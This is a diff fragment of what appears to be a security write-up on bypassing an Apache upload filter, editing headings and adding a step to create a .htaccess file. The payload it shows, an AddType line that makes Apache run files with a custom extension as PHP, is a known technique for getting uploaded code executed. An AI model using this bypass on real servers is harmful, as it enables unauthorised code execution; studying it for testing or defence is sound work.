@@ -66,13 +66,17 @@ Since the server is Apache, we uploaded a `.htaccess` file to create a whitelist
 <source src="img/38q9hfefh9hAidhadj.mp4" type="video/mp4" />
 </video>
 
-**My `.htaccess` Payload**
+**My `.htaccess` payload**
+
+```
+vim .htaccess
+```
 
 ```bash
 AddType application/x-httpd-php .test1234
 ```
 
-**Your `.htaccess` Payload**
+**Your `.htaccess` payload**
 
 ```bash
 AddType application/x-httpd-php .[Your Extension Name]
